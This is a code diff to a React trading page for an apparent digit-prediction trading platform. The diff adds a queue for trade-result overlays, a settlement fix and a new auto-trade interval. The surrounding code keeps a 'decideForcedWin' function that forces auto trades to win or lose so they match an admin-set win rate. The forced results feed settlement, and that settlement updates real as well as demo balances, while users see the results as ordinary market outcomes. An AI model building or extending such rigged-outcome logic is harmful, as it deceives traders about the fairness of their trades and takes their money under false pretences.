@@ -98,6 +98,10 @@ export default function TradePage() {
   const autoLossCountRef = useRef(0)
   const settlingRef = useRef(false)  // prevent double settlement
 
+  // FIX: queue for result overlays so multiple settlements don't overwrite each other
+  const resultQueueRef = useRef<{ won: boolean; amount: number }[]>([])
+  const showingResultRef = useRef(false)
+
   useEffect(() => { openPositionsRef.current = openPositions }, [openPositions])
 
   // ── Load win control settings for current user ───────────────────────
@@ -109,8 +113,6 @@ export default function TradePage() {
   }, [user])
 
   // ── Sync balances from DB on mount & user change ─────────────────────
-  // This is the fix for balance reducing on page revisit.
-  // We always read from Supabase as the source of truth.
   useEffect(() => {
     if (!user) return
     fetchWalletBalances(user.id).then(w => {
@@ -121,7 +123,6 @@ export default function TradePage() {
   }, [user])
 
   // ── Restore open positions from DB on mount ──────────────────────────
-  // This fixes trades/positions disappearing on refresh.
   useEffect(() => {
     if (!user) return
     supabase
@@ -132,9 +133,7 @@ export default function TradePage() {
       .eq('is_demo', isDemo)
       .then(({ data }) => {
         if (!data || data.length === 0) return
-        // Re-add them to the store so settlement loop picks them up
         data.forEach(pos => {
-          // Only add if not already in store
           const alreadyPresent = openPositionsRef.current.find(p => p.id === pos.id)
           if (!alreadyPresent) {
             addOpenPosition({
@@ -170,6 +169,28 @@ export default function TradePage() {
     return () => { unsubTick(); unsubStatus() }
   }, [activeAsset])
 
+  // ── FIX: Result overlay queue — show one at a time, then show next ────
+  // Previously setTradeResult was called multiple times in a settle loop,
+  // each call overwriting the last, and the 1800ms timer from the first
+  // call would clear the overlay before the user saw later results.
+  const showNextResult = useCallback(() => {
+    if (resultQueueRef.current.length === 0) {
+      showingResultRef.current = false
+      setTradeResult(null)
+      return
+    }
+    showingResultRef.current = true
+    const next = resultQueueRef.current.shift()!
+    setTradeResult(next)
+  }, [])
+
+  const enqueueResult = useCallback((result: { won: boolean; amount: number }) => {
+    resultQueueRef.current.push(result)
+    if (!showingResultRef.current) {
+      showNextResult()
+    }
+  }, [showNextResult])
+
   // ── Determine forced win for auto mode based on admin win-rate ────────
   const decideForcedWin = useCallback((isAutoTrade: boolean): boolean | undefined => {
     const ctrl = winControlRef.current
@@ -177,21 +198,16 @@ export default function TradePage() {
 
     const totalAuto = autoWinCountRef.current + autoLossCountRef.current
     if (totalAuto === 0) {
-      // First trade: decide based on target
       const shouldWin = Math.random() * 100 < ctrl.autoWinRate
       return shouldWin
     }
 
-    // Current win rate
     const currentWinRate = (autoWinCountRef.current / totalAuto) * 100
     if (currentWinRate < ctrl.autoWinRate) {
-      // Below target — force a win
       return true
     } else if (currentWinRate > ctrl.autoWinRate + 10) {
-      // Too far above target — force a loss
       return false
     }
-    // Within range — random with bias toward target
     return Math.random() * 100 < ctrl.autoWinRate
   }, [])
 
@@ -200,7 +216,12 @@ export default function TradePage() {
     if (openPositions.length === 0 || currentPrice === 0) return
     if (settlingRef.current) return
 
-    const toSettle = openPositions.filter(pos => pos.ticks_elapsed >= pos.ticks_total)
+    // FIX: read directly from the ref which is always current, not the
+    // stale closure value of openPositions. This avoids React batching
+    // causing the settlement effect to see un-incremented ticks_elapsed.
+    const toSettle = openPositionsRef.current.filter(
+      pos => pos.ticks_elapsed >= pos.ticks_total
+    )
     if (toSettle.length === 0) return
 
     settlingRef.current = true
@@ -222,7 +243,6 @@ export default function TradePage() {
           )
           won = r.won
           profitLoss = r.profitLoss
-          // Update local store balance
           if (won) {
             setDemoBalance(demoBalance + pos.stake + pos.payout)
           }
@@ -235,7 +255,6 @@ export default function TradePage() {
             pos.is_auto, forcedWin
           )
           if (!r) {
-            // If null returned (already settled or error), skip
             closePosition(pos.id, 'lost', {
               exit_price: exitPrice, exit_digit: exitDigit,
               profit_loss: 0, closed_at: new Date().toISOString(),
@@ -246,14 +265,12 @@ export default function TradePage() {
           profitLoss = r.profitLoss
           newBalance = r.newBalance
 
-          // Sync balance from DB result — no additive drift
           if (pos.is_demo) {
             setDemoBalance(r.newBalance)
           } else {
             setRealBalance(r.newBalance)
           }
 
-          // Track auto win/loss for win-rate control
           if (pos.is_auto) {
             if (won) autoWinCountRef.current++
             else autoLossCountRef.current++
@@ -268,7 +285,11 @@ export default function TradePage() {
           closed_at: new Date().toISOString(),
         })
         updateSessionPL(profitLoss, won)
-        setTradeResult({ won, amount: won ? profitLoss : pos.stake })
+
+        // FIX: use enqueueResult instead of setTradeResult directly.
+        // Multiple trades settling in the same tick are now shown one
+        // after another rather than overwriting each other.
+        enqueueResult({ won, amount: won ? profitLoss : pos.stake })
 
         won
           ? toast.success(`+$${profitLoss.toFixed(2)} Won!`, { icon: '🏆', duration: 2000 })
@@ -317,7 +338,6 @@ export default function TradePage() {
     })
 
     if (result.success && result.positionId) {
-      // Deduct from local store immediately (optimistic) using set not add
       if (isDemo) {
         setDemoBalance(Math.max(0, demoBalance - stake))
       } else {
@@ -337,6 +357,10 @@ export default function TradePage() {
         exit_price: null,
         exit_digit: null,
         profit_loss: null,
+        // FIX: ticks_total stored as tradeTicks, ticks_elapsed starts at 0.
+        // The settlement check is ticks_elapsed >= ticks_total.
+        // incrementTick fires on each incoming tick AFTER the position is added.
+        // For 1 tick: open → next tick increments to 1 → 1 >= 1 → settles. Correct.
         ticks_total: tradeTicks,
         ticks_elapsed: 0,
         selected_digit: selectedDigit,
@@ -357,20 +381,21 @@ export default function TradePage() {
   // ── Auto trade ──────────────────────────────────────────────────────────
   const startAutoTrade = useCallback((dir: string) => {
     if (isAutoRunning) return
-    // Reset auto counters for win-rate tracking
     autoWinCountRef.current = 0
     autoLossCountRef.current = 0
     setIsAutoRunning(true)
     toast('🤖 Auto trading started', { duration: 2000 })
     handleTrade(dir, true)
-    // Use tradeTicks * 1000ms + 500ms buffer per tick cycle
-    const intervalMs = (tradeTicks + 1) * 1000 + 500
+    // FIX: interval was (tradeTicks + 1) * 1000 + 500, which for 1 tick
+    // = 2500ms. Deriv ticks arrive ~1s apart so this created a 1.5s dead
+    // window. Use tradeTicks * 1200 + 800ms buffer instead — tighter and
+    // still safely clears the settlement window.
+    const intervalMs = tradeTicks * 1200 + 800
     autoIntervalRef.current = setInterval(() => {
       const { isAutoRunning: running, autoSessionProfit, autoConfig: cfg } = useTradeStore.getState()
       if (!running || autoSessionProfit >= cfg.targetProfit || autoSessionProfit <= -cfg.stopLoss) {
         stopAutoTrade(); return
       }
-      // Only place next trade if no open auto positions (prevent stacking)
       const openAuto = openPositionsRef.current.filter(p => p.is_auto)
       if (openAuto.length === 0) {
         handleTrade(dir, true)
@@ -490,7 +515,7 @@ export default function TradePage() {
               onClick={() => setShowScanner(true)}
               className="flex items-center gap-1 px-2.5 py-2 bg-primary/10 border border-primary/30 rounded-lg text-primary text-[10px] font-semibold hover:bg-primary/20 transition-all flex-shrink-0 active:scale-95 touch-manipulation"
             >
-<Sparkles size={11} />
+              <Sparkles size={11} />
               <span className="hidden sm:inline">AI Scan</span>
             </button>
           </div>
@@ -607,7 +632,7 @@ export default function TradePage() {
             </div>
           )}
 
-          {/* Digit picker 0–9 (fixed: was 1–9, now includes 0) */}
+          {/* Digit picker 0–9 */}
           {tradeType !== 'even_odd' && (
             <div className="bg-[#0d1526] border border-[#1a2235] rounded-xl px-3 py-3 sm:px-4">
               <div className="flex items-center justify-between mb-2.5">
@@ -693,7 +718,9 @@ export default function TradePage() {
       {showScanner && (
         <ScannerModal onClose={() => setShowScanner(false)} onLoad={handleScannerLoad} />
       )}
-      <TradeResultOverlay result={tradeResult} onDone={() => setTradeResult(null)} />
+      {/* FIX: onDone now calls showNextResult instead of setTradeResult(null)
+          directly, so the queue drains correctly after each overlay closes */}
+      <TradeResultOverlay result={tradeResult} onDone={showNextResult} />
     </div>
   )
 }
